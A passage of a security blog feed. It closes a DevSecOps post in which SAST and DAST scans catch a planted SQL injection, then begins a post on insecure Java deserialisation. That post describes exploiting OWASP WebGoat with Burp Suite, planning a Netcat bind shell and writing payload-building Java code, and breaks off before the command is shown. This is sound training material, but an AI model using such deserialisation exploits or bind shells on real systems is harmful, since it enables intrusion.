<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/apiburp-007.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/apiburp-007-768x665.png" alt="" class="wp-image-633" width="576" height="499" srcset="./../../../wp-content/uploads/2021/09/apiburp-007-768x665.png 768w, ./../../../wp-content/uploads/2021/09/apiburp-007-300x260.png 300w, ./../../../wp-content/uploads/2021/09/apiburp-007-210x182.png 210w, ./../../../wp-content/uploads/2021/09/apiburp-007.png 903w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>SQL Injection being used to dump all data from the database</em></figcaption></figure></div>


<h3 class="wp-block-heading" id="updated-sast-security-testing-results">Updated &#8211; SAST Security Testing Results</h3>


<p>The code change responsible for introducing the SQLi vulnerability triggered the build pipeline, and so a re-run of the SAST security testing was performed.</p>



<p>We can see from the new results that the SQL injection vulnerability was detected by ShiftLeft&#8217;s SAST-Scan and classified with a HIGH severity rating. The offending lines of code are identified within the report item, together with links to the relevant Java source file, and an explanation of what the vulnerability is and why it is considered to be a weakness.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-002.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-002-768x386.jpg" alt="" class="wp-image-573" width="576" height="290" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-002-768x386.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-002-300x151.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-002-1024x515.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-002-1536x772.jpg 1536w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-002-210x106.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-002.jpg 1625w" sizes="(max-width: 576px) 100vw, 576px" /></a></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-003.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-003.jpg" alt="" class="wp-image-572" width="587" height="475" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-003.jpg 783w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-003-300x243.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-003-768x621.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-003-210x170.jpg 210w" sizes="(max-width: 587px) 100vw, 587px" /></a></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-004.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-004.jpg" alt="" class="wp-image-571" width="587" height="410" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-004.jpg 782w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-004-300x209.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-004-768x536.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-004-210x147.jpg 210w" sizes="(max-width: 587px) 100vw, 587px" /></a></figure></div>


<h3 class="wp-block-heading" id="updated-dast-security-testing-results">Updated &#8211; DAST Security Testing Results </h3>


<p>The SQLI vulnerability I introduced is not particularly subtle &#8211; any SAST scanner should easily be able to detect an error of this nature. However, the same type of vulnerability could have been introduced using code with a more complex execution path, which might have made the flaw more difficult to detect using static analysis methods.</p>



<p>To simulate a scenario where the SQLi vulnerability has been missed by the SAST scan for some reason, I triggered a new release causing the DAST security scan to run and examined the results.</p>



<p>As the following illustration shows, the number of vulnerabilities detected by the ZAP API scanner increased from the baseline of 2, to 5:</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-008.jpg"><img loading="lazy" decoding="async" width="300" height="232" src="./../../../wp-content/uploads/2021/09/az-pl-release-008.jpg" alt="" class="wp-image-576" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-008.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-008-210x162.jpg 210w" sizes="(max-width: 300px) 100vw, 300px" /></a></figure></div>



<p>We can see that the DAST scan has successfully detected the SQL Injection vulnerability through active testing of the API:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-009.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-009-768x617.jpg" alt="" class="wp-image-575" width="576" height="463" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-009-768x617.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-release-009-300x241.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-009-210x169.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-release-009.jpg 867w" sizes="(max-width: 576px) 100vw, 576px" /></a></figure></div>



<p>&#8230; the test report entry provides the details of the HTTP request that was used by ZAP to elicit a response which proved SQL injection was possible, as well as description of the vulnerability and general advice for developers tasked with engineering a fix, and for avoiding introducing this type of vulnerability in future:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-010.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-010-768x523.jpg" alt="" class="wp-image-574" width="576" height="392" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-010-768x523.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-release-010-300x204.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-010-1024x698.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-release-010-210x143.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-release-010.jpg 1126w" sizes="(max-width: 576px) 100vw, 576px" /></a></figure></div>


<h2 class="wp-block-heading" id="conclusions">Conclusions</h2>


<p>Returning to the assessment criteria identified in the objectives at the start of this post, which outlines queries and concerns that might justifiably be expressed by stakeholders when considering a shift to a cloud-native DevSecOps approach, as a means of achieving greater focus on application security, earlier in the development lifecycle: </p>



<p><strong><span class="has-inline-color has-white-color">Bottleneck:</span> Will it slow the development process process down ?</strong><br>The automated, continuous and parallel nature of the security testing carried out within the pipeline should help to streamline the development process. Feedback on the discovery of security vulnerabilities is provided soon after introduction, rather than days, weeks or even months later perhaps when the product is much closer to release and when the development team has perhaps begun to disperse to other projects. Near-immediate security issue feedback means remediation can potentially take place within a single sprint iteration, rather than later in the project when the additional disruption is much more likely to introduce significant project delays.</p>



<p><strong><span class="has-inline-color has-white-color">Feedback:</span> will it allow developers to find out about security issues soon after they&#8217;ve been introduced, when remediation is comparatively easier and cheaper ?</strong></p>



<p>The automated, continuous nature of the security testing carried out within the pipeline whenever code changes are committed to the source repository means that security issues can be flagged up to the originating developer very quickly after its introduction. Although the pipeline constructed for this exercise is relatively simple, the architecture can easily be extended to integrate with messaging and ticket management systems, to ensure that vulnerability alerts are channelled to the correct audience and maintained throughout the remediation lifecycle.</p>



<p><strong><span class="has-inline-color has-white-color">Constructive:</span> will it provide information that can be understood by a development audience so it can be acted upon ?</strong></p>



<p>The information presented in the &#8220;Test Results&#8221; sections above demonstrate clearly that each of the security testing stages generate vulnerability reports containing entries which are informative and relevant. Crucially, each entry is supported by root cause indicators and actionable remediation advice, which helps developers who might not be familiar with software application vulnerability concepts understand why the vulnerability exists and what needs to be done to address it. </p>



<p><strong><span class="has-inline-color has-white-color">Overhead:</span> how much additional workload will it cause for the development team ?</strong></p>



<p>Arguably, the immediacy of the feedback provided by implementing continuous, automated security testing early in the development process should mean that the workload on developers is reduced in magnitude. Security issues are communicated back the originator much sooner, meaning that developers can tackle remediation when the relevant implementation details are still fresh in their minds, rather than having to recall the details at a later date &#8211; a process which inevitably takes longer and is likely to be more error prone.</p>



<p>None of the free/open source variants of security testing tools selected for this exercise proved to be invasive, or required any additional dependencies or modifications to be added to the application source code to support security testing. </p>



<p><strong><span class="has-inline-color has-white-color">Scalable:</span> how easy is to change, adapt, grow / shrink ?</strong></p>



<p>Personally, I found the Azure platform is well documented and highly intuitive to use. The modular nature of the YAML-based pipeline job and task definitions make the business of adding and removing functionality trivial and clear error logs simplify the troubleshooting process during pipeline development. Being script-based means that the infrastructure which defines the pipeline architecture can be snapshotted and tagged in the same way as any other software artefact . For this reason, it&#8217;s is easy to envisage how an organisation could adapt pipelines to suit their particular business requirements as needed.</p>



<p><strong><span class="has-inline-color has-white-color">Experimentation:</span> learning leads to innovation: developers are problem solvers &#8211; does it give developers the freedom try out different ways to fix security bugs, quickly, in an isolated environment without fear of breaking the release process, learning from mistakes without fear of retribution ?</strong></p>



<p>The highly configurable and scalable nature of the platform allows experimental, ad-hoc pipelines and deployment environments to be stood up and later decommissioned quickly and without affecting the  main development stream. This would also be the case with a conventional, on-premise pipeline with e.g. a &#8220;Git Flow&#8221;  style feature/hotfix/release branching strategy, but the point here is the ease with which pre-canned Azure tasks can be included, tested and removed &#8211; a feature which eliminates much of the time, effort and risk from &#8220;what if?&#8221; experimentation.</p>



<p><strong><span class="has-inline-color has-white-color">Costs:</span> What are the initial costs ? What does the ongoing spend profile looks like &#8211; is it easy to quantify and predict ?</strong></p>



<p>Although absolute initial and ongoing costs will obviously depend on factors such as the size of the development team, the size and complexity of the software applications, number of active projects, frequency of deployments etc, the automated cost metrics provided as standard by the Azure platform make it very easy to determine what the current accumulated costs are and what the  predicted spend profile looks like over time. Breakdowns by resource help to identify exactly which of the utilised services are costing the most, and historical data allows the root cause of spikes in costs to be analysed, helping to identify and tune out inefficiencies in the pipeline.</p>



<figure class="wp-block-image size-large"><a href="./../../../wp-content/uploads/2021/09/az-pl-costs.jpg"><img loading="lazy" decoding="async" width="1024" height="459" src="./../../../wp-content/uploads/2021/09/az-pl-costs-1024x459.jpg" alt="" class="wp-image-568" srcset="./../../../wp-content/uploads/2021/09/az-pl-costs-1024x459.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-costs-300x134.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-costs-768x344.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-costs-1536x688.jpg 1536w, ./../../../wp-content/uploads/2021/09/az-pl-costs-210x94.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-costs.jpg 1898w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption><em>Azure platform cost management dashboard</em></figcaption></figure>



<p><strong><span class="has-inline-color has-white-color">Metrics:</span> how easy is it to assess and report on the level of business risk exposure from the results generated from security testing in the pipeline ?</strong></p>



<p>The test results generated by the SAST, SCA and DAST pipeline stages are sufficiently detailed to provide vulnerability data input into threat modelling activities. Assuming the organisation has good understanding of the relative value its information assets, the nature and disposition of the trust boundaries that exist between them and the potential threats they may face, then the overall risk to the organisation&#8217;s business risk can be calculated using the preferred risk assessment technique. Continuous security testing means vulnerability data is kept up to date, so stakeholders can be confident that the calculated level of risk is accurate. Risk assessment data can then also be used prioritise vulnerability remediation activity, ensuring that the effort is being expended in the most effective manner.</p>



<p><strong><span class="has-inline-color has-white-color">ROI:</span> How can the organisation&#8217;s return on investment be measured using the results generated ?</strong></p>



<p>Probably the most immediate and comprehendible means of assessing the success of adopting a DevSecOps approach is by comparing the results of &#8220;before&#8221; and &#8220;after&#8221; penetration tests. There should be a measurable decrease in the number of vulnerabilities discovered late in the development process, with a corresponding increase in security issues being detected earlier in the lifecycle. If the team has an efficient time tracking process in place, it should be relatively straightforward to compute the reduction in the overall cost of remediation over time.</p>



<hr class="wp-block-separator"/>



<p></p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Software Vulnerabilities and Business Risk</title>
		<link>./../../../insecure-deserialisation/index.html</link>
		
		<dc:creator><![CDATA[spen440]]></dc:creator>
		<pubDate>Tue, 24 Aug 2021 17:07:37 +0000</pubDate>
				<category><![CDATA[Application Security]]></category>
		<category><![CDATA[Business Risk]]></category>
		<category><![CDATA[Insecure Deserialisation]]></category>
		<category><![CDATA[Java]]></category>
		<category><![CDATA[Lateral Movement]]></category>
		<category><![CDATA[Threat Modeling]]></category>
		<guid isPermaLink="false">./../../../index.html?p=374</guid>

					<description><![CDATA[For developers working with systems exposed to the internet, it&#8217;s difficult to avoid the influence that information security has on day to day work. Perhaps a recent penetration test by a third party has highlighted vulnerabilities that need addressing, or maybe the system has already suffered a security breach. There might be a requirement to [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>For developers working with systems exposed to the internet, it&#8217;s difficult to avoid the influence that information security has on day to day work. Perhaps a recent penetration test by a third party has highlighted vulnerabilities that need addressing, or maybe the system has already suffered a security breach. There might be a requirement to demonstrate that the system is compliant with a particular security standard. Its also possible that the development team belongs to an enlightened organisation that understands why their software products need to be secure, and have measures in place within their development process to prevent and detect security vulnerabilities.</p>



<p>Conversely, if a system is designed to sit in apparent safety behind a firewall, or on a separate internal network segment, or has no direct access to sensitive data, it&#8217;s not straightforward from a developer&#8217;s point of view to see how &#8211; or why &#8211; a system might be attacked.</p>



<span id="more-374"></span>


<h2 class="simpletoc-title">Table of Contents</h2>
<ul class="simpletoc-list">
<li><a href="#background">Background</a>

</li>
<li><a href="#defence-in-depth">Defence In Depth</a>

</li>
<li><a href="#context-is-king">Context is king</a>

</li>
<li><a href="#threat-modelling">Threat Modelling</a>

</li>
<li><a href="#risk">Risk</a>

</li>
<li><a href="#how-software-vulnerabilities-contribute-to-risk">How software vulnerabilities contribute to risk</a>


<ul><li>
<a href="#insecure-deserialisation">Insecure Deserialisation</a>

</li>
<li><a href="#java-serialisation">Java serialisation</a>

</li>
</ul>
<li><a href="#unsafe-java-deserialisation-using-webgoat-as-an-example">Unsafe Java deserialisation using WebGoat as an example</a>


<ul><li>
<a href="#explanation-of-the-vulnerability">Explanation of the vulnerability</a>

</li>
<li><a href="#exploitation">Exploitation</a>

</li>
</ul>
<li><a href="#deserialisation-vulnerabilities-in-the-wild">Deserialisation Vulnerabilities In The Wild</a>


<ul><li>
<a href="#cve20179805">CVE-2017-9805</a>

</li>
</ul>
<li><a href="#summary">Summary</a>
</li></ul>

<h2 class="wp-block-heading" id="background">Background</h2>


<p>Failure to understand how one vulnerable system can be commandeered to act as a link in an attack which chains multiple compromised systems together to achieve the attackers ultimate objective can lead to software security considerations being given low or even zero priority during development.</p>



<p>Until recently, responsibility for information security tended to fall squarely within the remit of systems and infrastructure engineers. A common misconception is that the firewalls, endpoint security, intrusion prevention and detection controls, etc in place absolve developers of any need to think about security. But analysis of data breaches in recent years shows that attackers are now more than capable of exploiting software system vulnerabilities to bypass security controls.</p>



<p>As a result, software developers now have a responsibility to take security seriously. But for those more used to story driven development, delivering functionality which satisfies user requirements on time and on budget, it can be very challenging to switch mindsets and start thinking like an attacker.</p>


<h2 class="wp-block-heading" id="defence-in-depth">Defence In Depth</h2>


<p>Security breaches can involve the compromise of several hosts across an internal network, with some hosts merely acting as an intermediate stepping stone in the chain of compromise. Just because an application doesn&#8217;t directly access high value information assets, it doesn&#8217;t mean that the underlying host can&#8217;t be used as a means of gaining access to the hosts that <em>do</em>.</p>



<p>Maybe the information that the application manipulates isn&#8217;t considered a likely target, but that&#8217;s of little consequence if the software introduces vulnerabilities which, for example, allow the host file system to be used as a staging area for the exfiltration of sensitive data exfiltration, or permits arbitrary script execution which allows system account password hashes to be harvested remotely and cracked offline.</p>



<p>Rather than assuming that infrastructure security controls will deal with every attack, taking a defence-in-depth approach not only protects local information assets but also plays a part in protecting the wider system &#8211; hindering, delaying and maybe even halting an attacker who is trying to move laterally through a network to reach the high value targets.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/lat-move-001-1.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/lat-move-001-1-768x675.png" alt="" class="wp-image-465" width="571" height="501" srcset="./../../../wp-content/uploads/2021/09/lat-move-001-1-768x675.png 768w, ./../../../wp-content/uploads/2021/09/lat-move-001-1-300x264.png 300w, ./../../../wp-content/uploads/2021/09/lat-move-001-1-210x185.png 210w, ./../../../wp-content/uploads/2021/09/lat-move-001-1.png 874w" sizes="(max-width: 571px) 100vw, 571px" /></a><figcaption><em>Over-reliance on perimeter, infrastructure based security controls can expedite an attacker&#8217;s lateral movement through a network.</em></figcaption></figure></div>



<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading" id="context-is-king">Context is king</h2>


<p>It&#8217;s important to view software system vulnerabilities in the context of the environment in which the system is deployed. Ultimately, the severity of a given software vulnerability should be assessed according to the risk it represents to the business, and this can vary depending on a number of factor environmental and temporal factors. A service which is vulnerable because it has a weak user authentication mechanism (for example) represents a high level risk if it is publicly accessible directly from the internet, but a lower level of risk if it is deployed on an isolated network accessible via a terminal located behind a locked door.</p>



<p>Understanding how a software system interacts with its host environment, and analysing all the different ways in which those interactions could be compromised &#8211; a process commonly known as <a href="https://owasp.org/www-community/Threat_Modeling"><span class="has-inline-color has-luminous-vivid-amber-color">Threat Modelling</span></a> &#8211; is a crucial part of this process.</p>


<h2 class="wp-block-heading" id="threat-modelling">Threat Modelling</h2>


<p>Threat modelling is a type of risk assessment methodology, similar in concept to techniques used in other engineering disciplines such as <a href="https://en.wikipedia.org/wiki/Failure_mode,_effects,_and_criticality_analysis"><span class="has-inline-color has-luminous-vivid-amber-color">Failure Mode and Effect Criticality Analysis (FMECA)</span></a>.</p>



<p>Threat modelling involves activities which include:</p>



<ul class="wp-block-list"><li>Identifying and classifying information assets according to sensitivity and value.</li><li>Determining which information assets are potentially exposed by a software vulnerability.</li><li>Considering what types of threat the system is likely to face in service.</li><li>Assessing the likelihood of each type of threat being able to exploit a vulnerability.</li><li>Assessing the impact on the business of an information asset being breached by a threat successfully exploiting a vulnerability.</li></ul>



<p>This process allows an organisation to categorise known software vulnerabilities in terms of the business risk that they actually represent in the target deployment environment. Armed with this knowledge, an organisation can then rank vulnerabilities by criticality and select an appropriate order and method of treatment to reduce overall business risk to an acceptable level.</p>
</div></div>



<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading" id="risk">Risk</h2>


<p>So what do we mean by risk ?</p>



<ul class="wp-block-list"><li>IT organisations deal with <span class="has-inline-color has-white-color">information </span>&#8211; i.e. facts and figures which have meaning in a specific context.</li><li><span class="has-inline-color has-white-color">Information </span>within an organisation is typically viewed as a collection of <span class="has-inline-color has-white-color">assets</span>, where each asset has a <span class="has-inline-color has-white-color">value </span>which reflects its importance to the organisation.</li><li>This <span class="has-inline-color has-white-color">value </span>can be derived from many factors, but is generally proportional to the seriousness of sustaining a degradation to one of three properties used to express the security state an information asset, namely: <span class="has-inline-color has-white-color">Confidentiality</span>, <span class="has-inline-color has-white-color">Integrity </span>and <span class="has-inline-color has-white-color">Availability </span>(or &#8220;<strong><a href="https://www.iso.org/obp/ui/#iso:std:iso-iec:27000:ed-5:v1:en:term:3.28"><span class="has-inline-color has-luminous-vivid-amber-color">CIA</span></a></strong>&#8220;).</li><li>These properties can be degraded through a variety of possible scenarios involving potential <span class="has-inline-color has-white-color">threats</span>, each of which needs to be assessed to quantify its contribution to the potential business risk to the organisation.</li><li>Information systems can contain flaws, or <span class="has-inline-color has-white-color">vulnerabilities</span>, which can adversely affect the <span class="has-inline-color has-white-color">CIA</span><strong><span class="has-inline-color has-white-color"> </span></strong>of the information <span class="has-inline-color has-white-color">assets </span>it manipulates.</li><li>The level of <span class="has-inline-color has-white-color">risk </span>is assessed by considering how <span class="has-inline-color has-white-color">likely </span>it is that a <span class="has-inline-color has-white-color">threat </span>will <span class="has-inline-color has-white-color">exploit </span>a <span class="has-inline-color has-white-color">vulnerability</span> and what the <span class="has-inline-color has-white-color">impact </span>could be given the <span class="has-inline-color has-white-color">value </span>of affected information <span class="has-inline-color has-white-color">asset</span>.</li><li><span class="has-inline-color has-white-color">Vulnerabilities </span>present in software systems expose the organisation to <span class="has-inline-color has-white-color">risk </span>in a number of ways, including:<ul><li><em>Financial loss</em></li><li><em>Operational capacity reduction</em></li><li><em>Legal or regulatory penalties</em></li><li><em>Reputational damage</em></li><li><em>Harm or damage to persons and property.</em></li></ul></li></ul>



<p></p>
</div></div>


<h2 class="wp-block-heading" id="how-software-vulnerabilities-contribute-to-risk">How software vulnerabilities contribute to risk</h2>


<p>There are institutions within the information security community that collate and distribute guidance aimed at improving information security.</p>



<p>One of these is the <span class="has-inline-color has-white-color">Open Web Application Security Project</span> (<a href="https://owasp.org/"><span class="has-inline-color has-luminous-vivid-amber-color">OWASP</span></a>), which provides &#8211; amongst many other things &#8211; a ranking of and remediation guidance for the <a href="https://owasp.org/www-project-top-ten/"><span class="has-inline-color has-luminous-vivid-amber-color">top 10 most critical web application security risks</span></a>.</p>



<p>To understand how software vulnerabilities contribute to business risk, it&#8217;s worth picking one item from the 2017 version of the OWASP top 10 list and using it to outline a simple example, to help give some context to what can seem like quite an abstract concept. I&#8217;ve chosen &#8220;<a href="A8:2017 - Insecure Deserialisation"><span class="has-inline-color has-luminous-vivid-amber-color">A8:2017 &#8211; Insecure Deserialisation</span></a>&#8221; in this instance<span class="has-inline-color has-vivid-red-color">*</span>. There are countless other possible examples that would also fit here, but I&#8217;ve chosen this one because it seems easier to attribute the link between cause and effect directly to coding flaws, compared to some of the other risks types identified by OWASP. </p>



<p><span class="has-inline-color has-vivid-red-color">*</span><em>The 2021 version of the OWASP Top 10 which was in peer review at the time of writing proposes merging Insecure Deserialisation into a new more general category entitled &#8220;A08:2021-Software and Data Integrity Failures&#8221;.</em></p>


<h3 class="wp-block-heading" id="insecure-deserialisation">Insecure Deserialisation</h3>


<p>Serialisation has a multitude of uses &#8211; one of these is to facilitate the communication of objects in distributed architectures, such as <a href="https://www.corba.org/"><span class="has-inline-color has-luminous-vivid-amber-color">CORBA</span></a>, <a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html"><span class="has-inline-color has-luminous-vivid-amber-color">RMI</span></a><span class="has-inline-color has-luminous-vivid-amber-color"> </span>and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/86b9cf84-df2e-4f0b-ac22-1b957627e1ca"><span class="has-inline-color has-luminous-vivid-amber-color">DCOM</span></a>.</p>



<p>The ability to persist the state of an object so that it can be stored, or transmitted across a network and reconstructed, allows separate components of a distributed application to interact using common objects directly, without the need to encode and decode to and from other state representations and communications protocols, and regardless of any differences in host platform.</p>



<p>Serialisation is an approach that&#8217;s also used when implementing web APIs, microservices, and by client-side MVC web frameworks such as <a href="https://angularjs.org/"><span class="has-inline-color has-luminous-vivid-amber-color">AngularJS</span></a> and <a href="https://emberjs.com/"><span class="has-inline-color has-luminous-vivid-amber-color">Ember</span></a>.</p>



<p>Unsafe or insecure deserialisation arises when the serialised data received by a subsystem is trusted without prejudice. If the data can be modified by, or originates from, an intermediate party and the contents are not sanitised by the recipient to eliminate any malicious payloads, then a vulnerability is introduced.</p>


<h3 class="wp-block-heading" id="java-serialisation">Java serialisation</h3>


<p>The Java platform contains the <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/Serializable.html"><span class="has-inline-color has-luminous-vivid-amber-color">Serializable</span> </a>interface &#8211; classes which implement it must provide a number of methods, one of which (<em><span class="has-inline-color has-white-color">readObject</span></em>) accepts a serialised instance of itself in the form of a <span class="has-inline-color has-white-color"><em>ObjectInputStream</em> </span>object.</p>



<p>This method deserialises the passed-in serialised object, obtaining from it attribute values which are used to populate a new empty instance of the class, effectively re-creating the original object in memory. This object can then be interacted with in the same way as objects generated in the &#8220;usual&#8221; way by the JVM at runtime from compiled bytecode.</p>



<p>This mechanism might be used within a distributed component architecture, allowing disparate subsystems using serialised objects to communicate over a network. It could be viewed as painless  way of passing commands from one subsystem to a remote, subordinate subsystem without having to worry about conversion between communications protocols.</p>



<p>However, this immediately introduces an unsafe deserialisation vulnerability &#8211; one which may seem negligible in a trusted environment, but which can lead to significant risk if the serialised data passed in to the system can be accessed (or even originated) by attackers.</p>


<h2 class="wp-block-heading" id="unsafe-java-deserialisation-using-webgoat-as-an-example">Unsafe Java deserialisation using WebGoat as an example</h2>


<p>To try and help demonstrate this concept, I&#8217;ve used <strong><a href="https://owasp.org/www-project-webgoat/"><span class="has-inline-color has-luminous-vivid-amber-color">WebGoat</span> </a></strong>&#8211; a deliberately insecure, open source Java web application developed by<span class="has-inline-color has-white-color"> <a href="https://owasp.org/"><span class="has-inline-color has-luminous-vivid-amber-color">OWASP</span></a> </span>to act as a training aid for developers and security technologists.</p>



<figure class="wp-block-image size-large"><a href="./../../../wp-content/uploads/2021/09/az-webgoat.jpg"><img loading="lazy" decoding="async" width="1024" height="648" src="./../../../wp-content/uploads/2021/09/az-webgoat-1024x648.jpg" alt="" class="wp-image-479" srcset="./../../../wp-content/uploads/2021/09/az-webgoat-1024x648.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-webgoat-300x190.jpg 300w, ./../../../wp-content/uploads/2021/09/az-webgoat-768x486.jpg 768w, ./../../../wp-content/uploads/2021/09/az-webgoat-210x133.jpg 210w, ./../../../wp-content/uploads/2021/09/az-webgoat.jpg 1516w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption><em>WebGoat running in an Azure container instance</em></figcaption></figure>


<h3 class="wp-block-heading" id="explanation-of-the-vulnerability">Explanation of the vulnerability</h3>


<p>The <span class="has-inline-color has-white-color">WebGoat </span>application contains a Java class <em><span class="has-inline-color has-white-color">VulnerableTaskHolder</span></em> which implements the Java <em><span class="has-inline-color has-white-color">Serializable </span></em>interface. Objects of this class have attributes which have values assigned to them before serialisation takes place. The object is then serialised, and transmitted to the remote subsystem, where it is received and deserialised causing its overidden <em><span class="has-inline-color has-white-color">readObject </span></em>method to be executed. In this particular example, the <em><span class="has-inline-color has-white-color">readObject </span></em>method expects one of its attributes to be assigned a String value representing a system command, which it then executes within a new sub-process. In other the system makes unsafe assumptions about the security of its host environment. It assumes all input will be benign and makes no attempt to sanitise the data it receives before deserialising it and executing the contents.</p>


<h3 class="wp-block-heading" id="exploitation">Exploitation</h3>


<p>The vulnerable method is exposed to the internet by an API endpoint. This is normally called via a form on the web client UI provided with the <span class="has-inline-color has-white-color">WebGoat</span> application. In this example however, we&#8217;ll interact with the endpoint directly via an interception proxy (<a href="https://portswigger.net/burp"><span class="has-inline-color has-luminous-vivid-amber-color">Portswigger Burp Suite</span></a>):</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="./../../../wp-content/uploads/2021/08/burp-orig.png"><img loading="lazy" decoding="async" width="1024" height="855" src="./../../../wp-content/uploads/2021/08/burp-orig-1024x855.png" alt="" class="wp-image-405" srcset="./../../../wp-content/uploads/2021/08/burp-orig-1024x855.png 1024w, ./../../../wp-content/uploads/2021/08/burp-orig-300x250.png 300w, ./../../../wp-content/uploads/2021/08/burp-orig-768x641.png 768w, ./../../../wp-content/uploads/2021/08/burp-orig-210x175.png 210w, ./../../../wp-content/uploads/2021/08/burp-orig.png 1151w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption>Request to endpoint captured in Burp Suite</figcaption></figure></div>



<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
<p>A scan against the target reveals an open port; if the host OS happens to have default components installed such as<span class="has-inline-color has-luminous-vivid-amber-color"> <a href="https://sourceforge.net/p/nc110/git/ci/master/tree/">Netcat</a></span>, we might be able to start a bind shell which we can interact with remotely:</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/08/nmap-1.png"><img loading="lazy" decoding="async" width="775" height="335" src="./../../../wp-content/uploads/2021/08/nmap-1.png" alt="" class="wp-image-410" srcset="./../../../wp-content/uploads/2021/08/nmap-1.png 775w, ./../../../wp-content/uploads/2021/08/nmap-1-300x130.png 300w, ./../../../wp-content/uploads/2021/08/nmap-1-768x332.png 768w, ./../../../wp-content/uploads/2021/08/nmap-1-210x91.png 210w" sizes="(max-width: 775px) 100vw, 775px" /></a><figcaption><em>Finding an open port on the target for the shell</em></figcaption></figure></div>
</div></div>



<p>Exploitation involves having knowledge of the structure of the vulnerable Java class. In this scenario, WebGoat is open source, so the class structure is easy to obtain, but in a real-world scenario with a closed source target, an attacker might be able to find this out for example via an exposed source code repository, or by reverse engineering the application&#8217;s Java byte code.</p>



<p>Armed with this knowledge, we can write a small program which creates an instance of the vulnerable class, populates it with a malicious system command (line 34) and then serialises it:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.time.LocalDateTime;
import java.io.ByteArrayOutputStream;
import java.io.ByteArrayInputStream;
import java.util.Base64;


public class VulnerableTaskHolder implements Serializable
{
    private static final long serialVersionUID = 2;

    private String taskName;
    private String taskAction;
    private LocalDateTime requestedExecutionTime;

    public VulnerableTaskHolder(String taskName, String taskAction)
    {
        super();
        this.taskName = taskName;
        this.taskAction = taskAction;
        // cater for BST time delta on the target server
        this.requestedExecutionTime = LocalDateTime.now().minusHours(1);
    }

    public static void main(String[] args)
    {
        VulnerableTaskHolder go = new VulnerableTaskHolder
